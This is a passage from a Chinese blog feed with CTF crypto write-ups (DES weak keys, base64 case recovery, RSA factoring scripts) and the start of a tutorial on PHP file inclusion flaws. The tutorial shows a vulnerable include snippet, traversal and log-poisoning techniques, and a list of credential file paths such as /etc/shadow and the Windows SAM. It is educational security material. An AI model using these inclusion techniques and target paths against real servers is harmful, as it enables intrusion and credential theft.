class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="December"><a href="#December" class="headerlink" title="December"></a>December</h3><p>source.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> handle:</span><br><span class="line">flag = handle.read()</span><br><span class="line"></span><br><span class="line">padding_size = len(flag) + (<span class="number">8</span> - ( len(flag) % <span class="number">8</span> ))</span><br><span class="line">flag = flag.ljust(padding_size, <span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'key'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> handle:</span><br><span class="line">key = handle.read().strip()</span><br><span class="line"></span><br><span class="line">iv = <span class="string">"13371337"</span></span><br><span class="line">des = DES.new(key, DES.MODE_OFB, iv)</span><br><span class="line">ct = des.encrypt(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'ciphertext'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> handle:</span><br><span class="line">handle.write(ct)</span><br></pre></td></tr></table></figure><p>ciphertext：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">症o迩\&quot;郥^N@]X蹶i1鱑WETR^D垶b裓*?^VAAVC绀n?I鬩RTLE[ZD荩y擅&#x2F;蚗l]RTWN7</span><br></pre></td></tr></table></figure><p>根据分析这两个文件。推测这是一道DES.MODE_OFB的知道加密方式破解原文。再仔细审计加密脚本。发现没有告诉我们DES.MODE_OFB加密的原始key。</p><p>于是，经过谷歌后发现这可能是考DES.MODE_OFB的弱key(详细请移步<a href="https://en.wikipedia.org/wiki/Weak_key#Weak_keys_in_DES)。" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Weak_key#Weak_keys_in_DES)。</a></p><p>写脚本用常见弱key进行爆破：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import DES</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&#39;ciphertext&#39;, &#39;rb&#39;)</span><br><span class="line">ciphertext &#x3D; f.read()</span><br><span class="line">f.close()</span><br><span class="line">IV &#x3D; b&#39;13371337&#39;</span><br><span class="line">KEY&#x3D;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00&#39;</span><br><span class="line">a &#x3D; DES.new(KEY, DES.MODE_OFB, IV)</span><br><span class="line">plaintext &#x3D; a.decrypt(ciphertext)</span><br><span class="line">print (plaintext)</span><br><span class="line"></span><br><span class="line">KEY&#x3D;b&#39;\x1E\x1E\x1E\x1E\x0F\x0F\x0F\x0F&#39;</span><br><span class="line">a &#x3D; DES.new(KEY, DES.MODE_OFB, IV)</span><br><span class="line">plaintext &#x3D; a.decrypt(ciphertext)</span><br><span class="line">print (plaintext)</span><br><span class="line"></span><br><span class="line">KEY&#x3D;&quot;\xE1\xE1\xE1\xE1\xF0\xF0\xF0\xF0&quot;</span><br><span class="line">a &#x3D; DES.new(KEY, DES.MODE_OFB, IV)</span><br><span class="line">plaintext &#x3D; a.decrypt(ciphertext)</span><br><span class="line">print (plaintext)</span><br><span class="line"></span><br><span class="line">KEY&#x3D;&quot;\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF&quot;</span><br><span class="line">a &#x3D; DES.new(KEY, DES.MODE_OFB, IV)</span><br><span class="line">plaintext &#x3D; a.decrypt(ciphertext)</span><br><span class="line">print (plaintext)</span><br></pre></td></tr></table></figure><h3 id="Unvreakable-Vase"><a href="#Unvreakable-Vase" class="headerlink" title="Unvreakable Vase"></a>Unvreakable Vase</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zmxhz3tkb2vzx3roaxnfzxzlbl9jb3vudf9hc19jcnlwdg9vb30&#x3D;</span><br></pre></td></tr></table></figure><p>观测题目所给密文,发现是base64。密文中的大小写都变成小写。</p><p>我们可以根据不断测试大小写字符加语法判断，进行手动猜测…..</p><p><code>flag{does_this_even_count_as_cryptooo}</code></p><p>做完后，大佬才知道有专门的脚本还原(눈_눈)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> decode</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">data = <span class="string">'zmxhz3tkb2vzx3roaxnfzxzlbl9jb3vudf9hc19jcnlwdg9vb30='</span></span><br><span class="line">CHARSET = <span class="string">'abcdefghijklmnopqrstuvwxyz_&#123;&#125;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">case_variations</span><span class="params">(string)</span>:</span></span><br><span class="line">    possibilities = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        possibilities.append([char.lower(), char.upper()])</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">""</span>.join(perm) <span class="keyword">for</span> perm <span class="keyword">in</span> product(*possibilities)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b""</span></span><br><span class="line">real_data = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(data), <span class="number">4</span>):</span><br><span class="line">    crib = data[i:i + <span class="number">4</span>]</span><br><span class="line">    <span class="keyword">for</span> case_variation <span class="keyword">in</span> case_variations(crib):</span><br><span class="line">        <span class="keyword">if</span> all(chr(char) <span class="keyword">in</span> CHARSET <span class="keyword">for</span> char <span class="keyword">in</span> decode(case_variation)):</span><br><span class="line">            real_data += case_variation</span><br><span class="line">            flag += decode(case_variation)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(real_data)</span><br></pre></td></tr></table></figure><h3 id="Ooo-la-la"><a href="#Ooo-la-la" class="headerlink" title="Ooo-la-la"></a>Ooo-la-la</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">N &#x3D; 3349683240683303752040100187123245076775802838668125325785318315004398778586538866210198083573169673444543518654385038484177110828274648967185831623610409867689938609495858551308025785883804091</span><br><span class="line">e &#x3D; 65537</span><br><span class="line">c &#x3D; 87760575554266991015431110922576261532159376718765701749513766666239189012106797683148334771446801021047078003121816710825033894805743112580942399985961509685534309879621205633997976721084983</span><br></pre></td></tr></table></figure><p>传统的RSA加密，yafu N到pq 带到脚本即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,getPrime,isPrime</span><br><span class="line">N = <span class="number">3349683240683303752040100187123245076775802838668125325785318315004398778586538866210198083573169673444543518654385038484177110828274648967185831623610409867689938609495858551308025785883804091</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">87760575554266991015431110922576261532159376718765701749513766666239189012106797683148334771446801021047078003121816710825033894805743112580942399985961509685534309879621205633997976721084983</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">1830213987675567884451892843232991595746198390911664175679946063194531096037459873211879206428213</span></span><br><span class="line">q = <span class="number">1830213987675567884451892843232991595746198390911664175679946063194531096037459873211879206428207</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m=pow(c,d,N)</span><br><span class="line"><span class="keyword">print</span> (long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="Twinning"><a href="#Twinning" class="headerlink" title="Twinning"></a>Twinning</h3><p>进入题目,nc jh2i.com 50013</p><p>得到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Generating public and private key...</span><br><span class="line"></span><br><span class="line">Public Key in the format (e,n) is: (65537,28795374863)</span><br><span class="line">The Encrypted PIN is 28156503395</span><br><span class="line">What is the PIN?</span><br></pre></td></tr></table></figure><p>看见(e,n)推测是RSA.pin因该就是密文.我们要提交明文得到flag.</p><p>当我按照再次思路,yafu分解然后用Ooo-la-la提到rsa解密后提交答案是发现连接断开了.</p><p>看来得用全脚本来RSA.这时，有个问题出现了，怎么用python来分解N。</p><p>经过反复的nc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(e,n) is: (65537,28795374863) # 28795374863 &#x3D; 169691 · 169693 </span><br><span class="line">(e,n) is: (65537,1063946864483) #1063946864483 &#x3D; 1031477 · 1031479</span><br><span class="line">(e,n) is: (65537,4953152922623) #4953152922623 &#x3D; 2225567 · 2225569</span><br></pre></td></tr></table></figure><p>发现n的值偏小，且分解出来的质数相近。</p><p>且p与q相差2</p><p>所以可以立一元二次方程 0 =p**2+2p-n</p><p>利用根为正数的求根公式得：</p><p><img src="image-20200618112429889.png" alt="image-20200618112429889"></p><p>所以可以写代码为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on Mon Jun 13 22:01:50 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: 冰之幻魄</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,getPrime,isPrime</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpq</span><span class="params">(n)</span>:</span></span><br><span class="line">  n2=pow(n,<span class="number">0.5</span>)</span><br><span class="line">  m=pow((pow(int(n2+<span class="number">1</span>),<span class="number">2</span>)-n),<span class="number">0.5</span>)</span><br><span class="line">  <span class="keyword">return</span> [int(int(n2)-m+<span class="number">1</span>),int(int(n2)+m+<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">s = socket.socket()   </span><br><span class="line"><span class="comment">#nc jh2i.com 50013</span></span><br><span class="line">HOST = <span class="string">'jh2i.com'</span>  <span class="comment"># 服务器的主机名或者 IP 地址</span></span><br><span class="line">PORT =  <span class="number">50013</span>      <span class="comment"># 服务器使用的端口</span></span><br><span class="line"></span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line">x=s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">y=str(s.recv(<span class="number">1024</span>),encoding =<span class="string">'utf8'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">z=str(s.recv(<span class="number">1024</span>),encoding =<span class="string">'utf8'</span>)</span><br><span class="line"></span><br><span class="line">e,n=re.findall(<span class="string">r"\d+\.?\d*"</span>,y)</span><br><span class="line">pin=re.findall(<span class="string">r"\d+\.?\d*"</span>,z)</span><br><span class="line"></span><br><span class="line">pin=int(pin[<span class="number">0</span>])</span><br><span class="line">e=int(e)</span><br><span class="line">n=int(n)</span><br><span class="line">print(pin,e,n)  <span class="comment">#9543182834506 65537 11828096639999</span></span><br><span class="line">p,q=getpq(n)</span><br><span class="line">print(p,q)</span><br><span class="line">d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))%((p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m=pow(pin,d,n)</span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line">s.send(str(m).encode())</span><br><span class="line">print(str(s.recv(<span class="number">1024</span>),encoding =<span class="string">'utf8'</span>))</span><br><span class="line">print(str(s.recv(<span class="number">1024</span>),encoding =<span class="string">'utf8'</span>))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h3 id="Raspberry"><a href="#Raspberry" class="headerlink" title="Raspberry"></a>Raspberry</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 7735208939848985079680614633581782274371148157293352904905313315409418467322726702848189532721490121708517697848255948254656192793679424796954743649810878292688507385952920229483776389922650388739975072587660866986603080986980359219525111589659191172937047869008331982383695605801970189336227832715706317</span><br><span class="line">e &#x3D; 65537</span><br><span class="line">c &#x3D; 5300731709583714451062905238531972160518525080858095184581839366680022995297863013911612079520115435945472004626222058696229239285358638047675780769773922795279074074633888720787195549544835291528116093909456225670152733191556650639553906195856979794273349598903501654956482056938935258794217285615471681</span><br></pre></td></tr></table></figure><p>拿到题目分析发现 n、e、c，猜测是rsa解密。</p><p>分解N，发现分解出多个质数，但质数的数量刚好为整数：</p><p><img src="image-20200616112333257.png" alt="image-20200616112333257"></p><p>按常规RSA的常规实现中 n=p*q（p、q均为质数)只有两个质数组成。</p><p><strong>但根据rsa原理与数论知识，如果n可以分解为多个素数的乘积。可看成是RSA算法的推广形式。</strong><br>         例如：若<code>n=p‘*q*s*t,则r=(p-1)*(q-1)*(s-1)*(t-1),d=e^-1 mod r。</code></p><p>同理写成脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,getPrime,isPrime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">x=<span class="string">b''</span></span><br><span class="line">y=[</span><br><span class="line">(<span class="number">2208664111</span>,<span class="number">3290718047</span>),</span><br><span class="line">(<span class="number">2982067987</span>,<span class="number">2214452749</span>),</span><br><span class="line">(<span class="number">2465499073</span>,<span class="number">2589229021</span>),</span><br><span class="line">(<span class="number">3644712913</span>,<span class="number">3600488797</span>),</span><br><span class="line">(<span class="number">4205130337</span>,<span class="number">3130932919</span>),</span><br><span class="line">(<span class="number">4268160257</span>,<span class="number">3726115171</span>),</span><br><span class="line">(<span class="number">3510442297</span>,<span class="number">3789130951</span>),</span><br><span class="line">(<span class="number">2758626487</span>,<span class="number">2543358889</span>),</span><br><span class="line">(<span class="number">3650456981</span>,<span class="number">4221911101</span>),</span><br><span class="line">(<span class="number">2642723827</span>,<span class="number">2947867051</span>),</span><br><span class="line">(<span class="number">3810149963</span>,<span class="number">2850808189</span>),</span><br><span class="line">(<span class="number">4033877203</span>,<span class="number">3750978137</span>)]</span><br><span class="line"></span><br><span class="line">c=<span class="number">5300731709583714451062905238531972160518525080858095184581839366680022995297863013911612079520115435945472004626222058696229239285358638047675780769773922795279074074633888720787195549544835291528116093909456225670152733191556650639553906195856979794273349598903501654956482056938935258794217285615471681</span></span><br><span class="line">n=<span class="number">1</span></span><br><span class="line">k=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> y:</span><br><span class="line">    e=<span class="number">65537</span>      </span><br><span class="line">    q=i[<span class="number">1</span>]</span><br><span class="line">    p=i[<span class="number">0</span>]</span><br><span class="line">    n=p*q*n</span><br><span class="line">    k=k*(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">  </span><br><span class="line">d=gmpy2.invert(e,k)%(k)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print( long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>得flag：</p><p><img src="image-20200616113311011.png" alt="image-20200616113311011"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/wangqing84411433/article/details/89600335" target="_blank" rel="noopener">常见User-Agent</a></p><p><a href="https://lexsd6.github.io/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">文件包含漏洞的知识梳理</a></p><p><a href="https://zhuanlan.zhihu.com/p/107300262" target="_blank" rel="noopener">质数的几种判断方法</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对于文件包含漏洞的知识梳理</title>
      <link href="/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/"/>
      <url>/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>近日刷题发现对基础知识掌握有点不牢固,故逐步整理温习.今天还是先整理下文件包含漏洞.</p><p>文件包含是指:程序开发人员把经常使用代码写到一个文件里,在使用时直接调用那个文件而无需重新编写代码的过程称为文件包含.在c语言中的调用头文件和python import调用模块本质上就是一种文件包含。而文件包含漏洞（RFI）是指通过函数包含文件时，没有对包含的文件进行处理导致包含某些敏感文件或恶意文件。</p><a id="more"></a><h2 id="0x01文件包含漏洞的存在点"><a href="#0x01文件包含漏洞的存在点" class="headerlink" title="0x01文件包含漏洞的存在点"></a>0x01文件包含漏洞的存在点</h2><p>文件包含漏洞一般出现在文件系统函数的地方。比如include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file等文件系统函数。其中include、require、include_once、require_once四个函数在包含一个文件时，会执行里面的有php标记的代码。</p><p>最简单的，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'lexs'</span>]);<span class="comment">#可以控制lexs的参数内容来达到目的</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02远程文件包含"><a href="#0x02远程文件包含" class="headerlink" title="0x02远程文件包含"></a>0x02远程文件包含</h2><p>当PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include等包含函数可以加载远程文件。通常是被恶意人士用来远程包含一个恶意脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen &#x3D; On (允许打开URL文件,预设启用)</span><br><span class="line">allow_url_fopen &#x3D; Off (禁止打开URL文件)</span><br><span class="line">allow_url_include &#x3D; Off (禁止引用URL文件,新版增加功能,预设关闭)</span><br><span class="line">allow_url_include &#x3D; On (允许引用URL文件,新版增加功能)</span><br></pre></td></tr></table></figure><p><img src="image-20200605165003940.png" alt="image-20200605165003940"></p><h2 id="0x03本地文件包含"><a href="#0x03本地文件包含" class="headerlink" title="0x03本地文件包含"></a>0x03本地文件包含</h2><p>本地文件包含指包含服务器上的文件。这个方法来用来读取服务器上某些文件的敏感信息或包含执行上传的恶意脚本。</p><h3 id="（1）利用目录遍历漏洞来进行文件包含"><a href="#（1）利用目录遍历漏洞来进行文件包含" class="headerlink" title="（1）利用目录遍历漏洞来进行文件包含"></a>（1）利用目录遍历漏洞来进行文件包含</h3><p>目录遍历漏洞按我理解就是通过相对路径的方式访问文件.(通过url地址中’../‘ 表上一级目录’./‘表当前目录’/‘表下一级目录).例：访问zhuce.php的上级目录下的flag.php.</p><p><img src="image-20200605212506017.png" alt="image-20200605212506017"></p><p>但要注意php配置中的include_path与open_basedir的配置：</p><h4 id="1-include-path"><a href="#1-include-path" class="headerlink" title="1.include_path"></a>1.include_path</h4><p>当寻找要包含的文件时，PHP会分别考虑包含路径中的每个条目。它将检查第一个路径，如果找不到，请检查下一个路径，直到找到包含的文件或返回警告 或错误为止 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; UNIX: &quot;&#x2F;path1:&#x2F;path2&quot;</span><br><span class="line">include_path &#x3D; &quot;.:&#x2F;php&#x2F;includes&quot;</span><br><span class="line">;在UNIX，下在包含时先找当前目录下面的文件，如果找不到找&#x2F;php&#x2F;includes目录下的文件，若再找不到则报错。</span><br><span class="line">; Windows: &quot;\path1;\path2&quot;</span><br><span class="line">include_path &#x3D; &quot;.;c:\php\includes&quot;</span><br><span class="line">;在Windows，下在包含时先找当前目录下面的文件，如果找不到找c:\php\includes目录下的文件，若再找不到则报错。</span><br></pre></td></tr></table></figure><h4 id="2-open-basedir"><a href="#2-open-basedir" class="headerlink" title="2.open_basedir"></a>2.open_basedir</h4><p>将PHP可以访问的文件限制为指定的目录树，包括文件本身。这个指令是不是由安全模式打开或者关闭的影响。在open_basedir为配置时可以用任意遍历目录但有了open_basedir的设置就能够包含设置下的目录。</p><p><img src="image-20200605221901168.png" alt="image-20200605221901168"></p><p><img src="image-20200605221707515.png" alt="image-20200605221707515"></p><h3 id="（2）利用绝对路径来进行文件包含"><a href="#（2）利用绝对路径来进行文件包含" class="headerlink" title="（2）利用绝对路径来进行文件包含"></a>（2）利用绝对路径来进行文件包含</h3><p>我们可以通过绝对路径来进行文件包含：</p><p><img src="image-20200605223232782.png" alt="image-20200605223232782"></p><p>但用绝对路径然而受到open_basedir的限制：</p><p><img src="image-20200605221551100.png" alt="image-20200605221551100"></p><p>常见的敏感信息的默认绝对路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Windows系统：</span><br><span class="line">c:\boot.ini &#x2F;&#x2F; 查看系统版本</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件</span><br><span class="line"></span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码</span><br><span class="line"></span><br><span class="line">c:\windows\php.ini &#x2F;&#x2F; php 配置信息</span><br><span class="line"></span><br><span class="line">Linux&#x2F;Unix系统：</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件</span><br></pre></td></tr></table></figure><h3 id="（3）利用日志文件机制来进行文件包含"><a href="#（3）利用日志文件机制来进行文件包含" class="headerlink" title="（3）利用日志文件机制来进行文件包含"></a>（3）利用日志文件机制来进行文件包含</h3><p>因为服务器日志用记录下我们访问信息与发送的数据.</p><p>利用日志文件机制这个机制通过报错将报错的信息写入日志,再通过文件包含包含日志.</p><p><img src="image-20200606151047308.png" alt="image-20200606151047308"></p><h3 id="（4）利用-htaccess来进行文件包含"><a href="#（4）利用-htaccess来进行文件包含" class="headerlink" title="（4）利用 .htaccess来进行文件包含"></a>（4）利用 .htaccess来进行文件包含</h3><p>php.ini中auto_prepend_file和auto_append_file分别可以在作用范围内的php文件在文件头/尾自动include指定文件并且可以支持php伪协议.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file 在页面顶部加载文件</span><br><span class="line">auto_append_file  在页面底部加载文件</span><br></pre></td></tr></table></figure><p>注意：auto_prepend_file 与 auto_append_file 只能包含一个php文件，但这个php文件内可以包含多个其他的php文件。</p><p>在 